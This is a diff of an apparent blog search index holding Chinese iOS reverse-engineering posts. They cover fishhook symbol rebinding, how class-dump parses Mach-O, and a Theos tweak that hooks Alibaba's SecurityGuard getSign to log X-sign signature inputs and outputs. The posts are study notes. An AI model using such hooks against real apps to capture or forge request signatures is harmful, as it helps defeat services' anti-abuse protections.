+<p>单步步过rebind_symbols(rebs, 1),再次查看NSLog偏移位置的内存，发现里面写入的地址有变化，查看对应的汇编代码，已经替换为我们自己写的myNSLog的真实地址。</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/fishhook7.jpg" alt=""></p>
+<p>通过上述的调试过程，可以看出fishhook实现原理其实就是重新绑定了符号表，将原本NSLog的地址替换为myNSLog的地址。至于如何重新绑定这个过程需要深入分析fishhook源码，之后单独开一篇进行分析。</p>
+<h1 id="class-dump原理"><a href="#class-dump原理" class="headerlink" title="class-dump原理"></a>class-dump原理</h1><p>class-dump可以将应用的头文件导出，头文件包含了应用的类名和方法名对应关系，通过MachO文件格式来分析其原理。<br>同样以上述demo为例来探寻class-dump原理。<br>首先在数据段中寻找_objc_classlist节，该节中保存了程序中每个类的地址，下图可以看出0x8158地址上保存着数据0x100008E18,改地址保存的是类AppDelegate的信息</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/fishhook8.jpg" alt=""></p>
+<p>32 位类信息的结构体定义如下：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> objc_class_info&#123;</div><div class="line"><span class="keyword">int32_t</span> isa;</div><div class="line"><span class="keyword">int32_t</span> wuperclass;</div><div class="line"><span class="keyword">int32_t</span> cache;</div><div class="line"><span class="keyword">int32_t</span> vtable;</div><div class="line"><span class="keyword">int32_t</span> data;</div><div class="line"><span class="keyword">int32_t</span> reserved1;</div><div class="line"><span class="keyword">int32_t</span> reserved2;</div><div class="line"><span class="keyword">int32_t</span> reserved3;</div><div class="line">&#125;objc_class_info;</div></pre></td></tr></table></figure>
+<p>64 位的类信息的结构体定义如下：<br><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> objc_class_info_64&#123;</div><div class="line"><span class="keyword">int64_t</span> isa;</div><div class="line"><span class="keyword">int64_t</span> wuperclass;</div><div class="line"><span class="keyword">int64_t</span> cache;</div><div class="line"><span class="keyword">int64_t</span> vtable;</div><div class="line"><span class="keyword">int64_t</span> data;</div><div class="line"><span class="keyword">int64_t</span> reserved1;</div><div class="line"><span class="keyword">int64_t</span> reserved2;</div><div class="line"><span class="keyword">int64_t</span> reserved3;</div><div class="line">&#125;objc_class_info_64;</div></pre></td></tr></table></figure></p>
+<p>0x100008E18属于数据段的_objc_data节</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/fishhook9.jpg" alt=""></p>
+<p>该类的Data数据是0x100008D30，其中保存类的数据信息</p>
+<p>32位的结构体定义如下：<br><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> objc_class_data&#123;</div><div class="line"><span class="keyword">int32_t</span> flags;</div><div class="line"><span class="keyword">int32_t</span> instanceStart;</div><div class="line"><span class="keyword">int32_t</span> instanceSize;</div><div class="line"><span class="keyword">int32_t</span> ivarlayout;</div><div class="line"><span class="keyword">int32_t</span> name;</div><div class="line"><span class="keyword">int32_t</span> baseMethod;</div><div class="line"><span class="keyword">int32_t</span> baseProtocol;</div><div class="line"><span class="keyword">int32_t</span> ivars;</div><div class="line"><span class="keyword">int32_t</span> weakIvarLayout;</div><div class="line"><span class="keyword">int32_t</span> baseProperties;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
+<p>64 位的结构体定义如下：<br><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> objc_class_data_64&#123;</div><div class="line"><span class="keyword">int32_t</span> flags;</div><div class="line"><span class="keyword">int32_t</span> instanceStart;</div><div class="line"><span class="keyword">int32_t</span> instanceSize;</div><div class="line"><span class="keyword">int32_t</span> reserved; <span class="comment">//only arm64</span></div><div class="line"><span class="keyword">int64_t</span> ivarlayout;</div><div class="line"><span class="keyword">int64_t</span> name;</div><div class="line"><span class="keyword">int64_t</span> baseMethod;</div><div class="line"><span class="keyword">int64_t</span> baseProtocol;</div><div class="line"><span class="keyword">int64_t</span> ivars;</div><div class="line"><span class="keyword">int64_t</span> weakIvarLayout;</div><div class="line"><span class="keyword">int64_t</span> baseProperties;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
+<p>在数据段的_objc_const节中查看0x100008D30, 该节保存是objc常量</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/fishhook10.jpg" alt=""></p>
+<p>Name中数据地址为0x100007711,保存的字符串位于__objc_classname节中</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/fishhook11.jpg" alt=""></p>
+<p>_objc_const节中Base Methods地址的数据是0x100008BD0,在_objc_const节寻找该地址，该类相关的函数都在其中。</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/fishhook12.jpg" alt=""></p>
+<p>其中方法名对应的字符串位于代码段的__objc_methname节中。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过fishhook和class-dump原理来熟悉MachO文件格式，反之通过MachO文件格式去解析各种工具实现原理，收获良多</p>
+]]></content>
+      <tags>
+        <tag>iOS</tag>
+        <tag>MachO</tag>
+        <tag>hook</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>iOS Theos的一些心得</title>
+    <url>/2020/06/02/iOS-Theos%E7%9A%84%E4%B8%80%E4%BA%9B%E5%BF%83%E5%BE%97/</url>
+    <content><![CDATA[<p>之前在iOS逆向过程中，并不常用Hook方式去协助逆向，偶尔有用也是通过frida去定位打印一些固定算法的参数和结果。在iOS逆向领域，最基础的Hook方式或者说工具就要说到Theos了，本篇主要分享记录一下我在使用Theos Hook阿里系X-sign的一些心得。</p>
+<a id="more"></a>
+<h1 id="Theos简介"><a href="#Theos简介" class="headerlink" title="Theos简介"></a>Theos简介</h1><p>Theos是一款跨平台的越狱开发工具包，可以在Win、Linux、MacOS等平台下工作。由于Theos实现了对Cydia Substrace的封装，因而能实现对Objective-C运行时的Hook，也能实现对C语言函数的Hook。iOS平台下的Hook插件主要依赖于Theos中的Tweak插件，实质就是iOS平台的动态库（dylib），利用Cydia Substrace提供的组件进行加载。<br>至于如何安装Theos以及创建工程这里就不在一一叙述了，网上可以查到的资料实在太多。</p>
+<h1 id="Tweak-xm编写"><a href="#Tweak-xm编写" class="headerlink" title="Tweak.xm编写"></a>Tweak.xm编写</h1><p>“.xm”后缀表示源文件支持Logos和C/C++语法，如果是”.x”后缀，说明源文件仅支持Logos和C语法。<br>我们的Hook代码都写在该文件当中。</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="comment">//将要Hook的类写在%hook之后</span></div><div class="line">%hook SecurityGuardOpenUnifiedSecurity</div><div class="line"><span class="comment">// 需要Hook的类和函数写在下面</span></div><div class="line">- (id)getSign:(id)arg1 data:(id)arg2 env:(<span class="keyword">int</span>)arg3 api:(id)arg4&#123;</div><div class="line"><span class="comment">//Log打印参数和结果</span></div><div class="line">NSLog(@<span class="string">"-------------Hooked-------------"</span>);</div><div class="line">NSLog(@<span class="string">"----arg1:%@ arg2:%@ arg3:%d arg4:%@-------------"</span>, arg1, arg2, arg3, arg4);</div><div class="line"><span class="comment">//%orig执行原函数逻辑,也可以修改传入参数</span></div><div class="line">id result = %orig;</div><div class="line">NSLog(@<span class="string">"-------result:%@--------"</span>, result);</div><div class="line">NSLog(@<span class="string">"dddddddddddd"</span>);</div><div class="line"><span class="keyword">return</span> result;</div><div class="line">&#125;</div><div class="line"></div><div class="line">%end</div></pre></td></tr></table></figure>
+<p>这里不得不提一下class-dump还是很有用的，通过该工具dump出来的类和函数用于辅助Tweak插件编写太方便了，参数个数、类型以及返回值类型一目了然。</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Tweak.jpg" alt=""></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本篇主要简单记录一下自己Tweak Hook过程，相当于留个笔记，并没有太多的技术在内，后续有其他Tweak用法会加进去。</p>
+]]></content>
+      <tags>
+        <tag>iOS</tag>
+        <tag>Hook</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>dyld的那些事</title>
     <url>/2020/12/30/dyld%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/</url>
     <content><![CDATA[<p>前几天学习了MachO文件的基本结构，简单了解了MathO的工作原理，但是里面经常会涉及到dyld加载器，本篇主要学习dyld加载应用程序中的那些事。<br><a id="more"></a></p>
@@ -708,76 +781,6 @@ gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数�
       <tags>
         <tag>iOS</tag>
         <tag>dyld</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>fishhook原理探究</title>
-    <url>/2020/12/23/fishhook%E5%8E%9F%E7%90%86%E6%8E%A2%E7%A9%B6/</url>
-    <content><![CDATA[<p>上一篇整理了一下MachO文件的基本结构，但是对其主要的工作原理并没有深究，fishhook是iOS安全中常见的hook框架，可以通过对其原理探究更加深入的了解MachO的工作原理。<br><a id="more"></a></p>
-<h1 id="fishhook"><a href="#fishhook" class="headerlink" title="fishhook"></a>fishhook</h1><p>fishHook是Facebook提供的一个动态修改链接mach-O文件的工具。利用MachO文件加载原理，通过修改懒加载表(Lazy Symbol Pointers)和非懒加载表(Non-Lazy Symbol Pointers)这两个表的指针达到C函数HOOK的目的。</p>
-<p>首先需要下载fishhook<a href="https://github.com/facebook/fishhookw" target="_blank" rel="external">源码</a>，新建项目，将其中的fishhook.c和fishhook.h文件放入目录下：</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/fishhook1.jpg" alt=""></p>
-<h2 id="fishhook简单利用"><a href="#fishhook简单利用" class="headerlink" title="fishhook简单利用"></a>fishhook简单利用</h2><p>fishhook.h内容并不多，只有两个接口函数和一个结构体，具体如下:</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> fishhook_h</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> fishhook_h</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> !defined(FISHHOOK_EXPORT)</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> FISHHOOK_VISIBILITY __attribute__((visibility(<span class="meta-string">"hidden"</span>)))</span></div><div class="line"><span class="meta">#<span class="meta-keyword">else</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> FISHHOOK_VISIBILITY __attribute__((visibility(<span class="meta-string">"default"</span>)))</span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></div><div class="line"><span class="keyword">extern</span> <span class="string">"C"</span> &#123;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">//__cplusplus</span></span></div><div class="line"></div><div class="line"><span class="keyword">struct</span> rebinding &#123;</div><div class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *name; <span class="comment">//需要HOOK的函数名称，字符串</span></div><div class="line">  <span class="keyword">void</span> *replacement; <span class="comment">//替换到哪个新的函数上(新函数地址)</span></div><div class="line">  <span class="keyword">void</span> **replaced; <span class="comment">//保存原始函数指针变量的指针</span></div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="function">FISHHOOK_VISIBILITY</span></div><div class="line"><span class="keyword">int</span> <span class="title">rebind_symbols</span><span class="params">(<span class="keyword">struct</span> rebinding rebindings[], <span class="keyword">size_t</span> rebindings_nel)</span>;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function">FISHHOOK_VISIBILITY</span></div><div class="line"><span class="keyword">int</span> <span class="title">rebind_symbols_image</span><span class="params">(<span class="keyword">void</span> *header,</span></div><div class="line">                         <span class="keyword">intptr_t</span> slide,</div><div class="line">                         <span class="keyword">struct</span> rebinding rebindings[],</div><div class="line">                         <span class="keyword">size_t</span> rebindings_nel);</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></div><div class="line">&#125;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">//__cplusplus</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">//fishhook_h</span></span></div></pre></td></tr></table></figure>
-<p>rebind_symbols函数的第一个参数传入rebinding结构体数组，hook一个函数只需要传入一个rebinding结构体，hook多个函数则传入多个rebinding结构体。</p>
-<p>rebinding结构体参数意义如下：<br><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="keyword">struct</span> rebinding &#123;</div><div class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *name; <span class="comment">//需要HOOK的函数名称，字符串</span></div><div class="line">  <span class="keyword">void</span> *replacement; <span class="comment">//替换到哪个新的函数上(新函数地址)</span></div><div class="line">  <span class="keyword">void</span> **replaced; <span class="comment">//保存原始函数指针变量的指针</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
-<p>demo的代码如下：<br><figure class="highlight"><table><tr><td class="code"><pre><div class="line">#import "ViewController.h"</div><div class="line">#import "fishhook.h"</div><div class="line"></div><div class="line">@interface ViewController ()</div><div class="line"></div><div class="line">@end</div><div class="line"></div><div class="line">@implementation ViewController</div><div class="line">    </div><div class="line">    </div><div class="line"></div><div class="line">- (void)viewDidLoad &#123;</div><div class="line">    [super viewDidLoad];</div><div class="line">    //定义rebingding结构体</div><div class="line">    struct rebinding nslogBind;</div><div class="line">    //函数名称</div><div class="line">    nslogBind.name = "NSLog";</div><div class="line">    //新函数地址</div><div class="line">    nslogBind.replacement = myNSLog;</div><div class="line">    //保存原始函数地址的变量的指针</div><div class="line">    nslogBind.replaced = (void *)&amp;old_nslog;</div><div class="line">    </div><div class="line">    //数组</div><div class="line">    struct rebinding rebs[] = &#123;nslogBind&#125;;</div><div class="line">  </div><div class="line">    rebind_symbols(rebs, 1);</div><div class="line">&#125;</div><div class="line"></div><div class="line">//函数指针，用来保存原始的函数的地址</div><div class="line">static void(*old_nslog)(NSString *format, ...);</div><div class="line"></div><div class="line">//新的NSLog</div><div class="line">void myNSLog(NSString *format, ...)&#123;</div><div class="line">    format = @"~~勾上了！\n";</div><div class="line">    //再调用原来的nslog</div><div class="line">    old_nslog(format);</div><div class="line">&#125;</div><div class="line"></div><div class="line">- (void)touchesBegan:(NSSet&lt;UITouch *&gt; *)touches withEvent:(UIEvent *)event&#123;</div><div class="line">    NSLog(@"点击了屏幕");</div><div class="line">&#125;</div><div class="line"></div><div class="line">@end</div></pre></td></tr></table></figure></p>
-<p>运行点击屏幕，就可以Hook NSLog函数输出我们自己定义的字符串。</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/fishhook2.jpg" alt=""></p>
-<h2 id="fishhook原理分析"><a href="#fishhook原理分析" class="headerlink" title="fishhook原理分析"></a>fishhook原理分析</h2><p>首先有个问题需要思考，fishhook为什么可以Hook系统的C函数，只有动态才有可能被Hook，C函数是静态的，OC是动态的，这是因为系统的C函数有动态的部分，也就是符号绑定的过程。</p>
-<p>PIC技术（位置代码独立）：在文件内部生成一个表， 函数名称：函数地址，这玩意就是符号表<br>当MachO由dyld加载到内存中时，在调用NSLOg时，dyld将该函数地址赋值到符号表函数地址，这个过程就叫做符号绑定。</p>
-<p>我们在之前的代码基础上添加两句NSLog输出</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/fishhook3.jpg" alt=""></p>
-<p>前面的NSLog是为了提前将该函数进行绑定，也即时懒加载符号表中，非懒加载符号在dyld加载时就会绑定真实的地址值，而懒加载不会，只有第一次去调用才会绑定真实地址，在第二次调用时直接使用真实地址。</p>
-<p>编译demo，使用MachOView查看编译生成的MachO文件，可以看到NSLog是位于懒加载符号表的第一个，offset为0x8020，这里说一下为什么要在最上面的代码写一个NSLog,是为了先完成绑定真实地址的过程，下次调用就不用再去绑定了。</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/fishhook4.jpg" alt=""></p>
-<p>在rebind_symbols调用处下断点，调试输入命令image list查看demo运行时的基址。</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/fishhook5.jpg" alt=""></p>
-<p>用获取到的基址加上NSLog函数偏移0x8020，memory read查看内存，查看对应内存地址的汇编代码dis -s，发现是NSLog的函数真实地址</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/fishhook6.jpg" alt=""></p>
-<p>单步步过rebind_symbols(rebs, 1),再次查看NSLog偏移位置的内存，发现里面写入的地址有变化，查看对应的汇编代码，已经替换为我们自己写的myNSLog的真实地址。</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/fishhook7.jpg" alt=""></p>
-<p>通过上述的调试过程，可以看出fishhook实现原理其实就是重新绑定了符号表，将原本NSLog的地址替换为myNSLog的地址。至于如何重新绑定这个过程需要深入分析fishhook源码，之后单独开一篇进行分析。</p>
-<h1 id="class-dump原理"><a href="#class-dump原理" class="headerlink" title="class-dump原理"></a>class-dump原理</h1><p>class-dump可以将应用的头文件导出，头文件包含了应用的类名和方法名对应关系，通过MachO文件格式来分析其原理。<br>同样以上述demo为例来探寻class-dump原理。<br>首先在数据段中寻找_objc_classlist节，该节中保存了程序中每个类的地址，下图可以看出0x8158地址上保存着数据0x100008E18,改地址保存的是类AppDelegate的信息</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/fishhook8.jpg" alt=""></p>
-<p>32 位类信息的结构体定义如下：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> objc_class_info&#123;</div><div class="line"><span class="keyword">int32_t</span> isa;</div><div class="line"><span class="keyword">int32_t</span> wuperclass;</div><div class="line"><span class="keyword">int32_t</span> cache;</div><div class="line"><span class="keyword">int32_t</span> vtable;</div><div class="line"><span class="keyword">int32_t</span> data;</div><div class="line"><span class="keyword">int32_t</span> reserved1;</div><div class="line"><span class="keyword">int32_t</span> reserved2;</div><div class="line"><span class="keyword">int32_t</span> reserved3;</div><div class="line">&#125;objc_class_info;</div></pre></td></tr></table></figure>
-<p>64 位的类信息的结构体定义如下：<br><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> objc_class_info_64&#123;</div><div class="line"><span class="keyword">int64_t</span> isa;</div><div class="line"><span class="keyword">int64_t</span> wuperclass;</div><div class="line"><span class="keyword">int64_t</span> cache;</div><div class="line"><span class="keyword">int64_t</span> vtable;</div><div class="line"><span class="keyword">int64_t</span> data;</div><div class="line"><span class="keyword">int64_t</span> reserved1;</div><div class="line"><span class="keyword">int64_t</span> reserved2;</div><div class="line"><span class="keyword">int64_t</span> reserved3;</div><div class="line">&#125;objc_class_info_64;</div></pre></td></tr></table></figure></p>
-<p>0x100008E18属于数据段的_objc_data节</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/fishhook9.jpg" alt=""></p>
-<p>该类的Data数据是0x100008D30，其中保存类的数据信息</p>
-<p>32位的结构体定义如下：<br><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> objc_class_data&#123;</div><div class="line"><span class="keyword">int32_t</span> flags;</div><div class="line"><span class="keyword">int32_t</span> instanceStart;</div><div class="line"><span class="keyword">int32_t</span> instanceSize;</div><div class="line"><span class="keyword">int32_t</span> ivarlayout;</div><div class="line"><span class="keyword">int32_t</span> name;</div><div class="line"><span class="keyword">int32_t</span> baseMethod;</div><div class="line"><span class="keyword">int32_t</span> baseProtocol;</div><div class="line"><span class="keyword">int32_t</span> ivars;</div><div class="line"><span class="keyword">int32_t</span> weakIvarLayout;</div><div class="line"><span class="keyword">int32_t</span> baseProperties;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
-<p>64 位的结构体定义如下：<br><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> objc_class_data_64&#123;</div><div class="line"><span class="keyword">int32_t</span> flags;</div><div class="line"><span class="keyword">int32_t</span> instanceStart;</div><div class="line"><span class="keyword">int32_t</span> instanceSize;</div><div class="line"><span class="keyword">int32_t</span> reserved; <span class="comment">//only arm64</span></div><div class="line"><span class="keyword">int64_t</span> ivarlayout;</div><div class="line"><span class="keyword">int64_t</span> name;</div><div class="line"><span class="keyword">int64_t</span> baseMethod;</div><div class="line"><span class="keyword">int64_t</span> baseProtocol;</div><div class="line"><span class="keyword">int64_t</span> ivars;</div><div class="line"><span class="keyword">int64_t</span> weakIvarLayout;</div><div class="line"><span class="keyword">int64_t</span> baseProperties;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
-<p>在数据段的_objc_const节中查看0x100008D30, 该节保存是objc常量</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/fishhook10.jpg" alt=""></p>
-<p>Name中数据地址为0x100007711,保存的字符串位于__objc_classname节中</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/fishhook11.jpg" alt=""></p>
-<p>_objc_const节中Base Methods地址的数据是0x100008BD0,在_objc_const节寻找该地址，该类相关的函数都在其中。</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/fishhook12.jpg" alt=""></p>
-<p>其中方法名对应的字符串位于代码段的__objc_methname节中。</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过fishhook和class-dump原理来熟悉MachO文件格式，反之通过MachO文件格式去解析各种工具实现原理，收获良多</p>
-]]></content>
-      <tags>
-        <tag>iOS</tag>
-        <tag>MachO</tag>
-        <tag>hook</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>iOS Theos的一些心得</title>
-    <url>/2020/06/02/iOS-Theos%E7%9A%84%E4%B8%80%E4%BA%9B%E5%BF%83%E5%BE%97/</url>
-    <content><![CDATA[<p>之前在iOS逆向过程中，并不常用Hook方式去协助逆向，偶尔有用也是通过frida去定位打印一些固定算法的参数和结果。在iOS逆向领域，最基础的Hook方式或者说工具就要说到Theos了，本篇主要分享记录一下我在使用Theos Hook阿里系X-sign的一些心得。</p>
-<a id="more"></a>
-<h1 id="Theos简介"><a href="#Theos简介" class="headerlink" title="Theos简介"></a>Theos简介</h1><p>Theos是一款跨平台的越狱开发工具包，可以在Win、Linux、MacOS等平台下工作。由于Theos实现了对Cydia Substrace的封装，因而能实现对Objective-C运行时的Hook，也能实现对C语言函数的Hook。iOS平台下的Hook插件主要依赖于Theos中的Tweak插件，实质就是iOS平台的动态库（dylib），利用Cydia Substrace提供的组件进行加载。<br>至于如何安装Theos以及创建工程这里就不在一一叙述了，网上可以查到的资料实在太多。</p>
-<h1 id="Tweak-xm编写"><a href="#Tweak-xm编写" class="headerlink" title="Tweak.xm编写"></a>Tweak.xm编写</h1><p>“.xm”后缀表示源文件支持Logos和C/C++语法，如果是”.x”后缀，说明源文件仅支持Logos和C语法。<br>我们的Hook代码都写在该文件当中。</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="comment">//将要Hook的类写在%hook之后</span></div><div class="line">%hook SecurityGuardOpenUnifiedSecurity</div><div class="line"><span class="comment">// 需要Hook的类和函数写在下面</span></div><div class="line">- (id)getSign:(id)arg1 data:(id)arg2 env:(<span class="keyword">int</span>)arg3 api:(id)arg4&#123;</div><div class="line"><span class="comment">//Log打印参数和结果</span></div><div class="line">NSLog(@<span class="string">"-------------Hooked-------------"</span>);</div><div class="line">NSLog(@<span class="string">"----arg1:%@ arg2:%@ arg3:%d arg4:%@-------------"</span>, arg1, arg2, arg3, arg4);</div><div class="line"><span class="comment">//%orig执行原函数逻辑,也可以修改传入参数</span></div><div class="line">id result = %orig;</div><div class="line">NSLog(@<span class="string">"-------result:%@--------"</span>, result);</div><div class="line">NSLog(@<span class="string">"dddddddddddd"</span>);</div><div class="line"><span class="keyword">return</span> result;</div><div class="line">&#125;</div><div class="line"></div><div class="line">%end</div></pre></td></tr></table></figure>
-<p>这里不得不提一下class-dump还是很有用的，通过该工具dump出来的类和函数用于辅助Tweak插件编写太方便了，参数个数、类型以及返回值类型一目了然。</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Tweak.jpg" alt=""></p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本篇主要简单记录一下自己Tweak Hook过程，相当于留个笔记，并没有太多的技术在内，后续有其他Tweak用法会加进去。</p>
-]]></content>
-      <tags>
-        <tag>iOS</tag>
-        <tag>Hook</tag>
       </tags>
   </entry>
   <entry>
